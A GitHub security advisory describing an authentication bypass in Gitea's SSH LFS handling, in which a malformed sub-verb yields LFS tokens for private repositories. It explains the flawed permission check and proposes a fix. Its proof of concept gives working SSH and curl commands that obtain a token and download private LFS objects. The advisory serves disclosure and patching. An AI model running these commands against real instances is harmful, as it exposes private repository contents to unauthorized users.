# [H] Gitea: LFS authentication bypass via malformed SSH sub-verb allows unauthorized read access to private repositories

## Summary
Severity: High
Advisory: GHSA-7wvc-rvp7-w99x
CVE: CVE-2026-58423
CWE: CWE-287
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-7wvc-rvp7-w99x
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=1.23.0 <1.26.3

## Details
### Summary

A flaw in SSH LFS sub-verb handling allows any authenticated SSH user to obtain valid LFS credentials for any repository on the instance, including private repositories they have no access to. This enables unauthorized download of all LFS objects from any private repository.

### Details

In `cmd/serv.go`, the `getAccessMode` function determines the required access level for SSH operations. For LFS verbs (`git-lfs-authenticate`, `git-lfs-transfer`), it switches on the sub-verb (`upload`/`download`). If the sub-verb is neither, execution falls through to:

```go
setting.PanicInDevOrTesting("unknown verb: %s %s", verb, lfsVerb)
return perm.AccessModeNone
```

In production (`IsProd=true`), `PanicInDevOrTesting` only logs an error and does not panic. `AccessModeNone` (value `0`) is then passed to `ServCommand` in `routers/private/serv.go`, where the permission check block at line ~322 evaluates:

```go
if repoExist &&
    (mode > perm.AccessModeRead ||
     repo.IsPrivate ||
     owner.Visibility.IsPrivate() ||
     (user != nil && user.IsRestricted) ||
     setting.Service.RequireSignInViewStrict) {
    ...
    if userMode < mode {  // userMode < 0 is always false
        // deny access
    }
}
```

For private repositories, `repo.IsPrivate` triggers the permission check block, but `userMode < mode` evaluates to `userMode < 0`, which is always false — **access is granted regardless of the user's actual permissions**.

The function then returns successfully, and `runServ` generates a valid LFS JWT token with `Op: "badverb"`. On the HTTP LFS side (`services/lfs/server.go:599`), the `Op` field is only validated for write operations:

```go
if mode == perm_model.AccessModeWrite && claims.Op != "upload" {
    return nil, errors.New("invalid token claim")
}
```

Download operations do not check `Op`, so the attacker's token is accepted for all LFS read operations.

### PoC

Prerequisites: A Gitea instance with SSH and LFS enabled (default configuration). Two users: `admin` (owns a private repo with LFS objects) and `attacker` (a regular user with an SSH key, **no access** to the private repo).

```bash
# 1. Verify attacker has NO access via normal LFS authenticate
ssh git@gitea-instance "git-lfs-authenticate admin/private-repo.git download"
# Output: "User: attacker is not authorized to read admin/private-repo."

# 2. EXPLOIT: Use malformed sub-verb to bypass permission check
ssh git@gitea-instance "git-lfs-authenticate admin/private-repo.git badverb"
# Output: {"header":{"Authorization":"Bearer eyJ..."},"href":"https://gitea-instance/admin/private-repo.git/info/lfs"}

# 3. Use stolen token to request LFS object download
curl -X POST "https://gitea-instance/admin/private-repo.git/info/lfs/objects/batch" \
  -H "Content-Type: application/vnd.git-lfs+json" \
  -H "Accept: application/vnd.git-lfs+json" \
  -H "Authorization: Bearer eyJ..." \
  -d '{"operation":"download","objects":[{"oid":"<known-oid>","size":<size>}]}'
# Returns download URL with valid authorization header

# 4. Download private LFS content
curl -H "Authorization: Bearer eyJ..." \
  "https://gitea-instance/admin/private-repo.git/info/lfs/objects/<oid>"
# Returns the private LFS object content
```

### Impact

Any user with SSH access to a Gitea instance (which includes any registered user if self-registration is enabled) can read LFS objects from **any private repository** on the instance, regardless of their actual repository permissions. This is a confidentiality breach affecting all Gitea deployments running in production mode with SSH and LFS enabled (the default configuration).

### Suggested fix

Validate the LFS sub-verb before calling `getAccessMode`, or return an error instead of `AccessModeNone` for unknown verbs:

```go
case git.CmdVerbLfsAuthenticate, git.CmdVerbLfsTransfer:
    switch lfsVerb {
    case git.CmdSubVerbLfsUpload:
        return perm.AccessModeWrite
    case git.CmdSubVerbLfsDownload:
        return perm.AccessModeRead
    default:
        return fail(ctx, "Unknown LFS verb", "Unknown LFS verb: %s", lfsVerb)
    }
```

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-7wvc-rvp7-w99x
- https://nvd.nist.gov/vuln/detail/CVE-2026-58423
- https://github.com/go-gitea/gitea/pull/38008
- https://github.com/go-gitea/gitea/commit/42513398c05ca6bdf71da76cb6f9baaebe8cb924
- https://github.com/go-gitea/gitea/commit/8f4b7ebbf6061bd44b1ab3824f17f37b87fb1740
- https://blog.gitea.com/release-of-1.26.3-and-1.26.4
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.26.4
